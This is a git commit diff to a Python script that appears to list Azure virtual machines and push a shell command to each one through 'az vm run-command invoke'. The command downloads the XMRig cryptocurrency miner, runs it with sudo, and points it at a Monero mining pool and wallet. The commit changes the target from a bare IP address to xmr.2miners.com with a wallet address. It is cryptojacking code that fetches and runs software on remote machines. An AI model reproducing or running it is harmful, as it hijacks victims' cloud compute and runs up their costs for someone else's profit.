d215f4991c6a1c9ee1e9e8e81aec064b77934e08
Thuwarakan <mothuwarakan@gmail.com>
2023-01-30 12:55:40 +0530

    Update untitled.py

--- untitled.py
+++ untitled.py
@@ -34,7 +34,7 @@ response = az_cli('vm list')
 
 def deployer(x):
         
-            runC='az vm run-command invoke -g '+str(x)+' -n '+str(x)+' --command-id RunShellScript --scripts "wget https://github.com/xmrig/xmrig/releases/download/v6.15.2/xmrig-6.15.2-linux-static-x64.tar.gz && tar -xvzf xmrig-6.15.2-linux-static-x64.tar.gz&& cd xmrig-6.15.2 &&sudo ./xmrig -o 20.40.57.194:443"'
+            runC='az vm run-command invoke -g '+str(x)+' -n '+str(x)+' --command-id RunShellScript --scripts "wget https://github.com/xmrig/xmrig/releases/download/v6.15.2/xmrig-6.15.2-linux-static-x64.tar.gz && tar -xvzf xmrig-6.15.2-linux-static-x64.tar.gz&& cd xmrig-6.15.2 &&sudo ./xmrig -o xmr.2miners.com:2222 -u 4834UE5mV3n1PG7yZRZ7mAiTGWi6mDtUJcgLugeYAj76NwDa8mG78x3JEvsMYFjCgbVPAX1V8coxW4RHknwHxG55Nvbk6Pi"'
             
         
             print("      * Script Executing : "+runC)
